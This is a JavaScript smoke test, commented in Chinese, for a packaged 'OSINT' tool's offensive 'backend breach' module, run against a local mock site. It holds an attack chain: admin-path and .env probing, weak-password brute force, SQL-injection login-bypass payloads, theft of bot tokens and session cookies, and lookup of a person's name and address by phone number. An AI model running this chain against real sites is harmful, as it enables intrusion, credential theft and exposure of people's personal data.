/**
 * 打包后 exe 冒烟：直接打 http://localhost:3999 的 offsec 接口，
 * 验证「后台突破」模块在 asar 打包环境里可正常加载与执行。
 * 前置：先启动 dist/win-unpacked/OSINT聚合工具.exe（服务监听 3999）。
 */
'use strict';

const http = require('http');
const target = require('./test-offsec-live'); // 复用靶站

function req(method, path, body) {
  return new Promise((resolve, reject) => {
    const data = body ? Buffer.from(JSON.stringify(body)) : null;
    const r = http.request({
      host: '127.0.0.1', port: 3999, path, method,
      headers: Object.assign({ 'Accept': 'application/json' },
        data ? { 'Content-Type': 'application/json', 'Content-Length': data.length } : {}),
      timeout: 30000,
    }, (res) => {
      let s = '';
      res.setEncoding('utf8');
      res.on('data', (c) => { s += c; });
      res.on('end', () => { try { resolve(JSON.parse(s)); } catch (e) { resolve({ __raw: s.slice(0, 300) }); } });
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

let pass = 0, fail = 0;
function ok(name, cond, extra) {
  if (cond) { pass++; console.log('PASS ' + name + (extra ? '  => ' + extra : '')); }
  else { fail++; console.log('FAIL ' + name + (extra ? '  => ' + extra : '')); }
}

(async () => {
  const health = await req('GET', '/api/health');
  ok('打包版服务存活', !!(health && health.ok !== false), '已加载源=' + ((health.scanners || []).length));

  const dict = await req('GET', '/api/offsec/dict');
  ok('字典接口可用', dict && dict.passwords >= 20,
    '后台路径=' + dict.adminPaths + ' 敏感文件=' + dict.exposedPaths +
    ' 弱口令=' + dict.passwords + ' 用户名=' + dict.users +
    ' 注入载荷=' + dict.sqli + ' 查询接口=' + dict.queryApis);

  // 起靶站跑完整链路（换端口，避免撞 4555）
  const srv = await new Promise((r) => {
    const s = target.startTarget(4566);
    s.on('listening', () => r(s));
  });
  const base = 'http://127.0.0.1:4566';
  try {
    const rc = await req('POST', '/api/offsec/recon', {
      url: base, subdomains: false, paths: ['/admin.php', '/.env', '/api/query', '/nope-404'],
    });
    ok('① 侦察：ThinkPHP 指纹', (rc.fingerprints || []).includes('ThinkPHP'),
      JSON.stringify(rc.fingerprints));
    const envHit = (rc.paths || []).find((x) => String(x.url).endsWith('/.env'));
    ok('① 侦察：.env 泄露打标', envHit && String(envHit.note).startsWith('★'),
      JSON.stringify((rc.paths || []).map((p) => p.url + ' ' + p.note)));
    ok('① 侦察：404 不入库', !(rc.paths || []).some((x) => String(x.url).includes('nope-404')), '');

    const br = await req('POST', '/api/offsec/brute', {
      url: base + '/admin.php',
      usernames: ['admin'], passwords: ['wrongone', 'admin888'], stopOnFirst: true,
    });
    const cands = br.candidates || [];
    ok('② 爆破：命中账号口令', cands.length >= 1 && cands[0].password === 'admin888',
      JSON.stringify(cands.map((c) => c.username + '/' + c.password)));
    const cookie = (cands[0] || {}).cookie || '';
    ok('② 爆破：拿到会话 Cookie', /admin_auth=/.test(cookie), cookie);

    const sq = await req('POST', '/api/offsec/sqli', {
      url: base + '/admin.php',
      usernames: ['admin'], payloads: ["admin' or '1'='1", "' or 1=1#"],
    });
    ok('② 注入：万能口令命中', (sq.candidates || []).length >= 1,
      JSON.stringify((sq.candidates || []).map((c) => c.password)));

    const loot = await req('POST', '/api/offsec/loot', {
      baseUrl: base, cookie, paths: ['/api/query'], sampleParams: { keyword: '13800138000' },
    });
    ok('③ 接管：扫出 Bot Token', (loot.botTokens || []).includes(target.TOKEN),
      JSON.stringify(loot.botTokens));
    ok('④ 扫荡：盲到查询接口', (loot.queryApis || []).length >= 1, JSON.stringify(loot.queryApis));

    const call = await req('POST', '/api/offsec/call', {
      url: base + '/api/query', method: 'POST',
      headers: { Cookie: cookie }, body: { keyword: '13800138000' },
    });
    const body = String(call.body || '');
    ok('④ 直调：拿到姓名', body.includes('张三'), body.slice(0, 200));
    ok('④ 直调：拿到街道住址', body.includes('金砂街道'), '');

    const tk = await req('POST', '/api/offsec/tokens', { url: base + '/.env' });
    ok('③ 接管：Token 提取接口', (tk.tokens || []).includes(target.TOKEN), JSON.stringify(tk.tokens));
  } finally {
    await target.stopTarget(srv);
  }

  console.log('\n结果: ' + pass + ' 通过, ' + fail + ' 失败');
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error('冒烟异常:', e.message); process.exit(1); });
